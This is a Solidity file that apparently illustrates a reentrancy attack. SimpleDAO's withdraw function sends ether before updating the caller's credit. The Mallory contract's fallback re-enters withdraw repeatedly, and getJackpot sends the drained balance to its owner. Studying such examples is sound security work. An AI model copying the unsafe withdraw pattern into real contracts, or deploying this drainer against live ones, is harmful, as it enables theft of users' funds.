pragma solidity ^0.4.24;

contract SimpleDAO {
  mapping (address => uint) public credit;

  function donate(address to) public payable {
    credit[to] += msg.value;
  }

  function withdraw(uint amount) public {
    if (credit[msg.sender]>= amount) {
      if (msg.sender.call.value(amount)()) {
        credit[msg.sender]-=amount;
      }
    }
  }

  function queryCredit(address to) public view returns (uint) {
    return credit[to];
  }

  function() public payable {}
}

contract Mallory {
  SimpleDAO public dao;
  address owner;

  constructor(SimpleDAO addr) public {
    owner = msg.sender;
    dao = addr;
  }

  function getJackpot() public {
    owner.transfer(address(this).balance);
  }

  function() public payable {
    dao.withdraw(dao.queryCredit(this));
  }
}